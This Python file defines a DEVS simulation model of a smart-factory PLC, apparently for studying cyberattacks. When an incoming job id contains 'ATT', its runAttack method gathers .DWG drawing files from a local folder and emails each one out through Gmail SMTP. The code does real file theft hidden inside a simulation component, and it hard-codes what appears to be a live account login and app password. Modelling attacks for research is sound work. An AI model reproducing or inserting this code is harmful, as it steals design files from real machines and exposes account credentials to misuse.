import os
import smtplib

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from src.ATOMIC_MODELS import *

class PLC(ATOMIC_MODELS):
    def __init__(self):
        ATOMIC_MODELS.__init__(self)
        self.setName(self.__class__.__name__)
        
        self.addInPorts("in")
        self.addOutPorts("out")
        
        self.state["sigma"]=math.inf
        self.state["phase"]="passive"
        self.addState("job-id", "")
        self.addState("processing_time", 5)

    def externalTransitionFunc(self, e, x):
        if x.port == "in":
            if self.state["phase"] == "passive":
                self.state["job-id"] = x.value

                if self.state["job-id"].find("ATT") != -1:
                    self.runAttack()

                self.holdIn("busy", self.state["processing_time"])
            elif self.state["phase"] == "busy":
                self.Continue(e)


    def internalTransitionFunc(self):
        if self.state["phase"] == "busy":
            self.passviate()


    def outputFunc(self):
        if self.state["phase"] == "busy":
            content = CONTENT()
            content.setContent("out", self.state["job-id"])
            return content


    def runAttack(self):
        print("ATTACK")

        dir = "D:\git\DEVS-Python\projects\smartfactory"
        files = os.listdir(dir)

        for file in files:
            extension = os.path.splitext(file)[1]
            if extension == ".DWG":
                filename = dir + '\\' + file
                self.sendEmail(filename)

            print(extension)
    
    def sendEmail(self, filename):
        # 세션생성, 로그인
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login('sumannam', 'knmrpoxtssgchpdb')

        # 제목, 본문 작성
        msg = MIMEMultipart()
        msg['Subject'] = 'dwg file'
        msg.attach(MIMEText('본문', 'plain'))

        # 파일첨부 (파일 미첨부시 생략가능)

        attachment = open(filename, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= " + filename)
        msg.attach(part)

        # 메일 전송
        s.sendmail("sumannam@gmail.com", "sumannam@naver.com", msg.as_string())
        s.quit()
